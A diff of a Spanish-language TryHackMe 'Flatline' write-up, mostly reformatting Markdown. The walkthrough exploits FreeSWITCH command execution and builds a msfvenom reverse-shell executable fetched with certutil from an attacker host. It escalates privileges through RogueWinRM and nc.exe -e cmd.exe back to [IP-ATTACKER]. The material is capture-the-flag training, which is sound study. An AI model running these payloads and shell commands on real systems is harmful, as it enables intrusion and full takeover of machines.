@@ -1,35 +1,42 @@
 ---
 title: Flatline - Tryhackme
 date: 2023-11-8
-categories: [Write up, Windows, Tryhackme]
-tags: [FreeSWITCH, SeImpersonatePrivilege, easy]     # TAG names should always be lowercase
+categories:
+  - Write up
+  - Windows
+  - Tryhackme
+tags:
+  - FreeSWITCH
+  - SeImpersonatePrivilege
+  - easy
 ---
+
+# Flatine
 
 Es una maquina que explota la vulnerabilidad de `FreeSWITCH` que permite la ejecución de comandos, luego se tiene que hacer uso de tu ingenio para subir un archivo malicioso o obtener una consola. Para escalar privilegios abusaremos del `SeImpersonatePrivilege` para ejecutar obtener una consola con privilegios
 
 ![20231108121503.png](20231108121503.png)
 
-- Link [Flatline](https://tryhackme.com/room/flatline)
-- Created by  [Nekrotic](https://tryhackme.com/p/Nekrotic)
+* Link [Flatline](https://tryhackme.com/room/flatline)
+* Created by  [Nekrotic](https://tryhackme.com/p/Nekrotic)
 
-# Metodología
+## Metodología
 
-- Enumeración
-  - Escaneo de puertos
-  - Enumeración de servicios
-- Explotación
-  - FreeSWITCH 1.10.1 - Command Execution
-  - Intrusión
-- Escalar Privilegios
-  - Usuario win-eom4pk0578n\nekrotic
-  - SeImpersonatePrivilege
+* Enumeración
+  * Escaneo de puertos
+  * Enumeración de servicios
+* Explotación
+  * FreeSWITCH 1.10.1 - Command Execution
+  * Intrusión
+* Escalar Privilegios
+  * Usuario win-eom4pk0578n\nekrotic
+  * SeImpersonatePrivilege
 
+## Walkthrough
 
-# Walkthrough
+### Enumeración
 
-## Enumeración
-
-### Escaneo de puertos
+#### Escaneo de puertos
 
 Iniciamos con nuestra herramienta preferida a escanear los puerto de la maquina victima.
 
@@ -52,8 +59,7 @@ PORT     STATE SERVICE       REASON
 
 `-n`: Esta opción le dice a Nmap que no realice la resolución de nombres DNS. Puedes usarlo si no deseas que Nmap realice búsquedas DNS inversas durante el escaneo.
 
-`-oG allportsScan`: Esta opción le indica a Nmap que genere la salida en formato "greppable" (Grep) y la guarde en un archivo llamado "allportsScan". Este archivo contendrá información detallada sobre los puertos abiertos y otros detalles del escaneo.
-Para entender un poco mas de los parametros que lanzamos con `nmap` podemos leer un poco lo siguiente:
+`-oG allportsScan`: Esta opción le indica a Nmap que genere la salida en formato "greppable" (Grep) y la guarde en un archivo llamado "allportsScan". Este archivo contendrá información detallada sobre los puertos abiertos y otros detalles del escaneo. Para entender un poco mas de los parametros que lanzamos con `nmap` podemos leer un poco lo siguiente:
 
 `-p-`: Esta opción indica a Nmap que escanee todos los puertos en lugar de un rango específico. El guion ("-") significa "todos los puertos". Esto permite escanear todos los puertos desde el puerto 1 hasta el 65535.
 
@@ -126,16 +132,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 `-vvv`: Esto establece el nivel de verbosidad del escaneo en "muy alto". Esto significa que Nmap proporcionará una salida detallada que incluye información adicional sobre el progreso del escaneo.
 
-`[IP-VICTIM]`: Debes reemplazar [IP-VICTIM] con la dirección IP del objetivo que deseas escanear. Este es el host en el que se realizará el escaneo.
+`[IP-VICTIM]`: Debes reemplazar \[IP-VICTIM] con la dirección IP del objetivo que deseas escanear. Este es el host en el que se realizará el escaneo.
 
 `-oN servicesScan`: Esta opción le dice a Nmap que genere la salida en formato "greppable" (Grep) y la guarde en un archivo llamado "servicesScan". Este archivo contendrá información detallada sobre los servicios y versiones detectadas en los puertos especificados.
 
-## Explotación 
+### Explotación
 
-### FreeSWITCH 1.10.1 - Command Execution
+#### FreeSWITCH 1.10.1 - Command Execution
 
-El puerto `3389` encontramos un servicio el cual tiene una vulnerabilidad
-de (FreeSWITCH)[https://www.exploit-db.com/exploits/47799]
+El puerto `3389` encontramos un servicio el cual tiene una vulnerabilidad de (FreeSWITCH)\[https://www.exploit-db.com/exploits/47799]
 
 Ejecutamos el exploit indicando el comando `whoami`
 
@@ -150,23 +155,25 @@ win-eom4pk0578n\nekrotic
 
 Tenemos respuesta de la maquina victima al comando `whoami` y tenemos el usuario `win-eom4pk0578n\nekrotic`
 
-### Intrusión 
+#### Intrusión
+
 Para obnener una consola de la maquina victima, vamos a crearnos un archivo malicioso, tu la puedes hacer con `nc.exe` el objetivo es el mismo.
 
-La idea es subir este fichero malicioso a la maquina victima y luego con el exploit que nos permite ejecutar comandos, ejecutar el archivo malicioso y enviandonos una consola 
+La idea es subir este fichero malicioso a la maquina victima y luego con el exploit que nos permite ejecutar comandos, ejecutar el archivo malicioso y enviandonos una consola
 
-- Primero, Creamos nuestro `.exe` malicioso
+* Primero, Creamos nuestro `.exe` malicioso
 
 ```java
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > calc.exe
 ```
 
-- Segundo, iniciamos un servidor en python
+* Segundo, iniciamos un servidor en python
 
 ```java
 ❯ python3 -m http.server 80
 ```
-- Tercero, con `certutil` podemos descargar el archivo a la maquina victima
+
+* Tercero, con `certutil` podemos descargar el archivo a la maquina victima
 
 ```java
 ❯ python3 exploitFreeSwitch.py [IP-VICTIM] 'certutil -urlcache -f http://[IP-ATTACKER]/calc.exe calc.exe'
@@ -174,13 +181,14 @@ Authenticated
 Content-Type: api/response
 Content-Length: 71
 ```
-- Cuarto, ponemos a la escucha `ncat` para recibir la consola
+
+* Cuarto, ponemos a la escucha `ncat` para recibir la consola
 
 ```java
 ❯ rlwrap ncat -lvnp 443
 ```
 
-- Quinto, ejecutemos el fichero malicioso
+* Quinto, ejecutemos el fichero malicioso
 
 ```java
 ❯ python3 exploitFreeSwitch.py [IP-VICTIM] '.\calc.exe'
@@ -188,44 +196,46 @@ Content-Length: 71
 
 Si lo hiciste bien, debes de tener una consola de la maquina victima
 
-## Escalada de privilegios 
+### Escalada de privilegios
 
 ![20231108125429.png](20231108125429.png)8
 
-Enumerando el sistema encotramos: 
+Enumerando el sistema encotramos:
 
 ```java
 C:\Program Files\FreeSWITCH>whoami /priv
 ```
-El usuario tiene habilitado el SeImpersonate 
+
+El usuario tiene habilitado el SeImpersonate
 
 ![20231108125556.png](20231108125556.png)
 
-### SeImpersonatePrivilege
+#### SeImpersonatePrivilege
 
 Haciendo uso de este privilegio se puede llegar a ejecutar comandos
 
-- Usaremos [RogueWinRM](https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1) 
+* Usaremos [RogueWinRM](https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1)
+* Descargamos los archivos en la maquina victima el `RogueWinRM` y el `nc.exe`
+* RogueWinRM:
 
-- Descargamos los archivos en la maquina victima el `RogueWinRM` y el `nc.exe` 
-
-- RogueWinRM:
 ```java
 C:\Users\Nekrotic\Documents>certutil -urlcache -f 'http://[IP-ATTACKER]/nc.exe nc.exe'
 ```
 
-- nc.exe:
+* nc.exe:
+
 ```java
 C:\Program Files\FreeSWITCH>certutil -urlcache -f http://[IP-ATTACKER]/RogueWinRM.exe RogueWinRM.exe
 ```
 
-Ahora ejecutamos 
+Ahora ejecutamos
 
 ```java
 RogueWinRM.exe -p "nc.exe" -a "-e cmd.exe [IP-ATTACKER] 444"
 ```
 
 Demos de asegurarnos que nos ponga un `[+] CreateProcessWithTokenW OK`
+
 ```java
 C:\Program Files\FreeSWITCH>.\RogueWinRM.exe -p "nc.exe" -a "-e cmd.exe [IP-ATTACKER] 444"
 .\RogueWinRM.exe -p "nc.exe" -a "-e cmd.exe [IP-ATTACKER] 444"
@@ -242,8 +252,7 @@ C:\Program Files\FreeSWITCH>
 
 ```
 
-Antes debemos de poner a la escucha `ncat` en nuestra maquina atacante
-y tendremos nuestra consola.
+Antes debemos de poner a la escucha `ncat` en nuestra maquina atacante y tendremos nuestra consola.
 
 ![20231108152402.png](20231108152402.png)
 
